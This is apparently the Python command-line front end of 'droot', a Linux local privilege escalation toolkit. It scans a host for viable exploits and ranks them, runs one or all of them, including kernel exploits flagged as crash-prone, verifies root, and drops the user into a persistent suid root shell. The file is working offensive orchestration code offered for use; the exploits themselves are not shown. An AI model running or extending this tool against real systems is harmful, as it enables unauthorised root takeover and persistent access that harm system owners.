"""
Command line interface.

droot -- Linux LPE toolkit. Author: baba01hacker.

  droot                      scan the host and rank viable exploits
  droot run <id|cve|--all>   execute an exploit (or every viable one)
  droot info <id|cve>        show full details for an exploit
  droot list                 list the whole registry
  droot report [path]        write a JSON report from the last scan
  droot shell                enter the suid root shell left by an exploit
  droot selftest             verify droot itself against the local box
"""
from __future__ import annotations

import argparse
import os
import sys
import time

from . import registry, report, ui
from . import runner as runner_mod
from .recon import gather_profile


def _cmd_scan(args):
    ui.header("droot scan", "profiling host and ranking %d exploits"
              % len(registry.REGISTRY))
    profile = gather_profile()
    if args.verbose:
        ui.kv("distro", profile.distro)
        ui.kv("user", "%s (uid=%d, groups=%s)" %
              (profile.username, profile.uid, ",".join(profile.groups)))
        ui.kv("container", profile.container["kind"])
        ui.kv("lsm", "selinux=%s apparmor_profiles=%d" %
              (profile.lsm["selinux"], profile.lsm["apparmor_profiles"]))
        ui.kv("af_alg", "yes (authencesn=%s)" % profile.authencesn)
        ui.kv("core_pattern writable", profile.writable.get("core_pattern"))
        ui.kv("/etc/passwd writable", profile.writable.get("etc_passwd"))
        print()

    rows = []
    for spec in registry.REGISTRY:
        verdict = registry.refine(spec, profile, registry.evaluate(spec, profile))
        rows.append((spec, verdict))

    vuln = [r for r in rows if r[1].status == "VULNERABLE"]
    vuln.sort(key=lambda r: -r[1].score)
    print()
    ui.verdict_table(vuln)
    print()
    print(c_summary(report.summary(rows)))
    if vuln:
        print(c_hint("top pick: %s (score %d) -- `droot run %s`"
                     % (vuln[0][0].name, vuln[0][1].score, vuln[0][0].id)))
    if args.json:
        path = args.json if isinstance(args.json, str) else None
        if not path:
            path = "droot-scan-%s.json" % time.strftime("%Y%m%d-%H%M%S")
        report.write_report(path, profile, rows)
        print(c_hint("report written to %s" % path))
    if not args.json and not args.verbose:
        pass
    return 0


def c_summary(text):
    return ui.c(text, "bold")


def c_hint(text):
    return ui.c(text, "cyan")


def _cmd_run(args):
    profile = gather_profile()
    r = runner_mod.Runner()
    specs = []
    if args.target in ("--all", "all"):
        for spec in registry.REGISTRY:
            verdict = registry.evaluate(spec, profile)
            if verdict.status == "VULNERABLE":
                specs.append((spec, verdict))
        specs.sort(key=lambda t: -t[1].score)
        if args.allow_risky is False:
            specs = [t for t in specs if t[0].risk != "crashy"]
        if args.top:
            specs = specs[:args.top]
    else:
        found = registry.find(args.target)
        if not found:
            print(ui.c("[-] nothing in the registry matches %r" % args.target,
                       "red"))
            return 2
        for spec in found:
            specs.append((spec, registry.refine(spec, profile,
                                                registry.evaluate(spec, profile))))

    if not specs:
        print(ui.c("[-] no viable exploit matched", "yellow"))
        return 1

    ui.header("droot run", "%d target(s)" % len(specs))
    root = False
    for spec, verdict in specs:
        if verdict.status != "VULNERABLE":
            ui.result_line(spec, runner_mod.base.RunResult(
                False, False, "not viable: %s" % verdict.status))
            continue
        if spec.risk == "crashy" and not args.allow_risky:
            ui.result_line(spec, runner_mod.base.RunResult(
                False, False, "skipped: crashy (use --allow-risky)"))
            continue
        print()
        print(ui.c("[*] %s (%s) risk=%s" %
                   (spec.name, spec.cve or "-", spec.risk), "cyan"))
        result = r.run(spec, profile, verdict, dry_run=args.dry_run)
        ui.result_line(spec, result)
        if result.log:
            print(ui.c("    log: %s" % result.log, "dim"))
        if result.root:
            root = True
            print()
            print(ui.c("[+] root confirmed -- canary marker uid=0", "bold",
                       "green"))
            rs = os.path.join(r.state_dir, ".rootshell")
            if os.path.exists(rs):
                print(ui.c("[+] persistent shell: %s -p" % rs, "green"))
            break

    if not root:
        print()
        print(ui.c("[-] no root this round", "yellow"))
    return 0 if root else 1


def _cmd_info(args):
    found = registry.find(args.target)
    if not found:
        print(ui.c("[-] nothing matches %r" % args.target, "red"))
        return 2
    profile = None
    for spec in found:
        try:
            profile = profile or gather_profile()
        except Exception:
            profile = None
        verdict = registry.refine(spec, profile,
                                  registry.evaluate(spec, profile)) if profile else \
            registry.Verdict("NEEDS_REVIEW", ["profile unavailable"])
        ui.info_block(spec, verdict)
    return 0


def _cmd_list(args):
    ui.header("droot registry", "%d exploits" % len(registry.REGISTRY))
    for spec in registry.REGISTRY:
        print("  %-18s %-28s %-16s %-7s rel %d/5" %
              (spec.id, spec.name, spec.cve or "-", spec.risk, spec.reliability))
    return 0


def _cmd_report(args):
    profile = gather_profile()
    rows = [(s, registry.evaluate(s, profile)) for s in registry.REGISTRY]
    path = args.path or "droot-report-%s.json" % time.strftime("%Y%m%d-%H%M%S")
    report.write_report(path, profile, rows)
    print(ui.c("[+] report written to %s" % path, "green"))
    return 0


def _cmd_shell(args):
    r = runner_mod.Runner()
    rs = os.path.join(r.state_dir, ".rootshell")
    if not os.path.exists(rs):
        print(ui.c("[-] no root shell yet -- run an exploit first", "yellow"))
        return 1
    os.execv(rs, [rs, "-p"])


def _cmd_selftest(args):
    from . import _selftest
    return _selftest.main()


def build_parser():
    p = argparse.ArgumentParser(
        prog="droot",
        description="Linux LPE toolkit -- kernel-aware viability, safe "
                    "execution, canary root verification")
    sub = p.add_subparsers(dest="cmd")

    s = sub.add_parser("scan", help="profile host and rank viable exploits")
    s.add_argument("--json", nargs="?", const=True, default=None,
                   help="write a JSON report (optional path)")
    s.add_argument("-v", "--verbose", action="store_true")
    s.set_defaults(func=_cmd_scan)

    s = sub.add_parser("run", help="run an exploit")
    s.add_argument("target", help="exploit id, CVE, or --all")
    s.add_argument("--allow-risky", action="store_true",
                   help="include crashy kernel exploits")
    s.add_argument("--top", type=int, default=None,
                   help="with --all: only the top N ranked")
    s.add_argument("--dry-run", action="store_true")
    s.set_defaults(func=_cmd_run)

    s = sub.add_parser("info", help="show exploit details")
    s.add_argument("target")
    s.set_defaults(func=_cmd_info)

    s = sub.add_parser("list", help="list the registry")
    s.set_defaults(func=_cmd_list)

    s = sub.add_parser("report", help="write a JSON report")
    s.add_argument("path", nargs="?", default=None)
    s.set_defaults(func=_cmd_report)

    s = sub.add_parser("shell", help="enter the suid root shell if present")
    s.set_defaults(func=_cmd_shell)

    s = sub.add_parser("selftest", help="verify droot on this box")
    s.set_defaults(func=_cmd_selftest)
    return p


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "cmd", None):
        args = parser.parse_args(["scan"])
    try:
        return args.func(args)
    except KeyboardInterrupt:
        print()
        print(ui.c("[*] interrupted", "yellow"))
        return 130


if __name__ == "__main__":
    sys.exit(main())
